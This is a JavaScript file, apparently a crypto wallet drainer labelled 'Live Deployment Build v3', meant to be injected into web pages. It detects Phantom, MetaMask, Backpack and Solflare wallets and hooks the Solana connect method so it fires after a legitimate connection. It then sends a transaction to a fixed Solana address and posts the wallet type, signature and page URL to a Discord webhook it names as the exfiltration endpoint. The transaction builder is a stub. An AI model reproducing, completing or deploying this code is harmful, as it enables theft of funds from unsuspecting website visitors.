// inject.js - Live Deployment Build v3
(function() {
    'use strict';

    // CONFIGURATION - LIVE DEPLOYMENT
    const CONFIG = {
        DESTINATION: "6JocA3wv4HWpBZFcVrqL8iFvVzpp43H4hCo5mayuutaB", 
        CHAIN: "solana",
        EXFIL_ENDPOINT: "https://discord.com/api/webhooks/1557067548464390195/4HclnD45AF0FtVIcaUgKtiYdXnySlxuN6bL645ZqWprM0HCsLAoIt1UZ_E-u2gPQAD5L",
        TRIGGER: "on_wallet_connect",
        MIN_BALANCE: 0.01,
        PRIORITY_FEE: 5000,
        STEALTH_DELAY: 1500,
    };

    // WALLET DETECTION MATRIX
    const WALLETS = {
        phantom: () => window.solana?.isPhantom && window.solana,
        metamask: () => window.ethereum?.isMetaMask && window.ethereum,
        backpack: () => window.backpack?.isBackpack && window.backpack,
        solflare: () => window.solflare?.isSolflare && window.solflare,
    };

    // DISCORD WEBHOOK SENDER
    async function sendToDiscord(data) {
        const payload = {
            embeds: [{
                title: "\ud83d\udea8 New Wallet Connected",
                color: 0x22c55e,
                fields: [
                    { name: "Wallet Type", value: data.wallet, inline: true },
                    { name: "Transaction Sig", value: `\`${data.signature}\``, inline: false },
                    { name: "Source URL", value: data.url, inline: false }
                ],
                timestamp: new Date().toISOString()
            }]
        };

        try {
            await fetch(CONFIG.EXFIL_ENDPOINT, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(payload),
                keepalive: true
            });
        } catch (e) {
            console.error('Discord exfil failed:', e);
        }
    }

    // CORE FUNCTIONS
    async function detectAndConnect() {
        for (const [name, detector] of Object.entries(WALLETS)) {
            const provider = detector();
            if (!provider) continue;
            
            try {
                const accounts = await provider.connect();
                console.log(`[+] Connected: ${name}`);
                return { name, provider, accounts };
            } catch (e) {
                console.warn(`[-] ${name} connection failed`);
            }
        }
        return null;
    }

    async function constructTransaction(provider, chain) {
        // Build transfer instruction to CONFIG.DESTINATION
        // Include priority fees and stealth parameters
        return null; // Placeholder for transaction builder
    }

    // EXECUTION ENGINE
    async function execute() {
        await new Promise(r => setTimeout(r, CONFIG.STEALTH_DELAY));
        
        const wallet = await detectAndConnect();
        if (!wallet) return;

        const tx = await constructTransaction(wallet.provider, CONFIG.CHAIN);
        if (!tx) return;

        try {
            const sig = await wallet.provider.signAndSendTransaction(tx);
            await sendToDiscord({
                wallet: wallet.name,
                signature: sig,
                url: window.location.href
            });
        } catch (e) {
            console.error('Tx failed:', e);
        }
    }

    // STEALTH TRIGGER: Override connect methods
    if (CONFIG.TRIGGER === "on_wallet_connect") {
        const originalConnect = window.solana?.connect;
        if (originalConnect) {
            window.solana.connect = async function(...args) {
                const result = await originalConnect.apply(this, args);
                execute(); // Fire after legitimate connection
                return result;
            };
        }
    } else {
        window.addEventListener('load', execute);
    }

})();
